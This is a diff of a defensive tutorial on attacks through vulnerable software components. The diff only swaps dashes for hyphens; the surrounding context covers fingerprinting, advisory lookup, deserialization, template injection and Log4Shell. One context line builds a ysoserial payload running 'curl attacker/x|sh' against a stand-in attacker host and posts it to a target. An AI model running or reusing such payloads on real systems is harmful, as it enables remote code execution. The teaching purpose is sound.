@@ -38,7 +38,7 @@ Exploiting a vulnerable component is usually a *research-free* attack. The vulne
 5. IMPACT     RCE / data theft / DoS / auth bypass -- then persist & pivot
 ```
 
-Because every step is public and repeatable, attackers automate it at internet scale. The defender's only durable advantage is **closing the window** between disclosure and patch—there is no cleverness to out-think, only a clock to beat.
+Because every step is public and repeatable, attackers automate it at internet scale. The defender's only durable advantage is **closing the window** between disclosure and patch-there is no cleverness to out-think, only a clock to beat.
 
 ## 1. Version Fingerprinting from the Outside
 
@@ -92,7 +92,7 @@ dist/js/jquery-1.12.4.min.js
 
 ## 4. Advisory-to-Exploit Lookup
 
-Once a version is known, the attacker uses the *same public databases defenders use*—in reverse. The advisory tells them exactly which versions are affected and what the impact is; the fixed-version note tells them whether you have patched.
+Once a version is known, the attacker uses the *same public databases defenders use*-in reverse. The advisory tells them exactly which versions are affected and what the impact is; the fixed-version note tells them whether you have patched.
 
 ```
 # Search the vulnerability databases by product/version
@@ -112,7 +112,7 @@ The advisory is a **targeting instruction**: affected range, impact, and a link 
 
 ## 5. Reaching a Transitive Dependency
 
-The vulnerable code is frequently one your team never imported directly. The attacker does not care *why* it is present—only that a reachable code path leads to it.
+The vulnerable code is frequently one your team never imported directly. The attacker does not care *why* it is present-only that a reachable code path leads to it.
 
 ```
 # You depend on a high-level library...
@@ -144,7 +144,7 @@ $ java -jar ysoserial.jar CommonsCollections1 'curl attacker/x|sh' > payload.bin
 $ curl --data-binary @payload.bin https://target.example/api/import
 ```
 
-The application never intended to run the payload—the vulnerable library (or a vulnerable gadget in a transitive library) provides the execution primitive.
+The application never intended to run the payload-the vulnerable library (or a vulnerable gadget in a transitive library) provides the execution primitive.
 
 ## 7. Expression-Language / Template RCE
 
@@ -160,7 +160,7 @@ POST /greeting  name={{7*7}}      -> response contains 49  (evaluated!)
 POST /greeting  name={{ <payload that reaches Runtime.exec> }}
 ```
 
-The defender's fix is not to out-code the framework—it is to run a *patched* version where the flaw is closed.
+The defender's fix is not to out-code the framework-it is to run a *patched* version where the flaw is closed.
 
 ## 8. Log-Message Injection (Log4Shell class)
 
@@ -196,7 +196,7 @@ AngularJS 1.x-> end-of-life; client-side flaws will never be fixed
 
 ## 10. Vulnerable OS Packages and Base Images
 
-Containers freeze whatever OS packages existed when the image was built. Months later, those `openssl`, `glibc`, or `curl` versions have public CVEs—and the image is still shipping them.
+Containers freeze whatever OS packages existed when the image was built. Months later, those `openssl`, `glibc`, or `curl` versions have public CVEs-and the image is still shipping them.
 
 ```
 $ trivy image myorg/webapp:1.4.2
@@ -214,7 +214,7 @@ Total: 147 (CRITICAL: 12, HIGH: 41 ...)
 
 ## 11. Algorithmic and Decompression DoS
 
-Not every component flaw is RCE. Parsers and decompressors have shipped bugs where a tiny malicious input consumes enormous CPU or memory—knocking a service over without any authentication.
+Not every component flaw is RCE. Parsers and decompressors have shipped bugs where a tiny malicious input consumes enormous CPU or memory-knocking a service over without any authentication.
 
 ```
 # Regular-expression denial of service (ReDoS) in a vulnerable
@@ -283,9 +283,9 @@ A component vulnerability is often the *first* link, not the whole chain. A medi
 ## Key Takeaways
 
 1. **The attack is inventory-vs-inventory.** Attackers match your versions to a public database; you win only by knowing your versions and patching first.
-2. **Fingerprinting is free.** Suppress banners and version headers to deny the easy match—defense-in-depth, not a fix on its own.
+2. **Fingerprinting is free.** Suppress banners and version headers to deny the easy match-defense-in-depth, not a fix on its own.
 3. **Transitive dependencies are the usual entry point.** The vulnerable code is often one nobody chose consciously.
-4. **RCE classes dominate impact**—deserialization, expression/template evaluation, and log injection turn a single old library into full compromise.
+4. **RCE classes dominate impact**-deserialization, expression/template evaluation, and log injection turn a single old library into full compromise.
 5. **Speed is the whole game.** The window between disclosure and mass exploitation is measured in hours; your patch cadence must respect that.
 
 ## Next Steps
